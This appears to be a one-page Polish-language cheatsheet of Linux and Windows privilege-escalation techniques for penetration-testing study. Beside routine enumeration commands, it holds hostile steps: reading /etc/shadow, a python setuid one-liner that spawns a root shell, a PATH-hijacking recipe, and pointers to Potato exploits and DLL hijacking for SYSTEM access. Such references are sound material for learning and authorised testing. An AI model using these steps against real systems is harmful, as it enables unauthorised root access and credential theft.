🐧 Linux PrivEsc Cheatsheet (1 strona A4)
🔍 1. Informacje o systemie
uname -a              # kernel – możliwe exploity
cat /etc/os-release   # dystrybucja
hostnamectl

👤 2. Użytkownicy / uprawnienia
id
whoami
sudo -l               # najważniejsze!
cat /etc/passwd
cat /etc/shadow       # jackpot jeśli dostępne

📦 3. SUID / SGID
find / -perm -4000 -type f 2>/dev/null


Najczęstsze rootowanie (wrzuć na GTFOBins):

vim, find, nmap, python, perl, bash

🧩 4. Capabilities
getcap -r / 2>/dev/null


Niebezpieczne:

python3 cap_setuid

perl cap_setuid

Root:

python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

🔄 5. Cronjobs
crontab -l
ls -la /etc/cron*


Edytowalny skrypt → ROOT.

📁 6. Uprawnienia plików
find / -writable -type f 2>/dev/null
find / -writable -type d 2>/dev/null

🛠️ 7. Usługi i procesy
ss -tulpn
ps aux

🧵 8. PATH Hijacking
echo '/bin/bash' > fake
chmod +x fake
export PATH=.:$PATH
sudo <komenda>

🎯 9. Kernel Exploits (lab only)
uname -r
searchsploit linux kernel

✔️ Przydatne strony

https://gtfobins.github.io

https://book.hacktricks.xyz

https://github.com/swisskyrepo/PayloadsAllTheThings

🪟 Windows PrivEsc Cheatsheet (1 strona A4)
🔍 1. Informacje o systemie
systeminfo
hostname
whoami /all

👥 2. Użytkownicy / grupy
net users
net localgroup
net user <USER>

🔑 3. Uprawnienia użytkownika
whoami /priv


Jeśli widzisz:

SeImpersonatePrivilege

SeAssignPrimaryTokenPrivilege

→ użyj: PrintSpoofer / JuicyPotato / RoguePotato

⏰ 4. Scheduled Tasks
schtasks /query /fo LIST /v


Editowalny .bat/.ps1 → SYSTEM.

🧮 5. Usługi
sc query
tasklist /v


Często prowadzi do:

DLL Hijacking

Nadpisywania binarki usługi

📁 6. Uprawnienia plików
icacls <plik>
icacls C:\ /findsid <user>

🔌 7. Porty / usługi lokalne
netstat -ano

🧵 8. DLL Hijacking

Edytowalna ścieżka → własna DLL → restart usługi → SYSTEM.

📦 Narzędzia Windows PrivEsc

WinPEAS

Seatbelt

PowerUp.ps1

PrivescCheck.ps1

Watson

✔️ Najważniejsze strony

https://lolbas-project.github.io

https://book.hacktricks.xyz

https://github.com/swisskyrepo/PayloadsAllTheThings
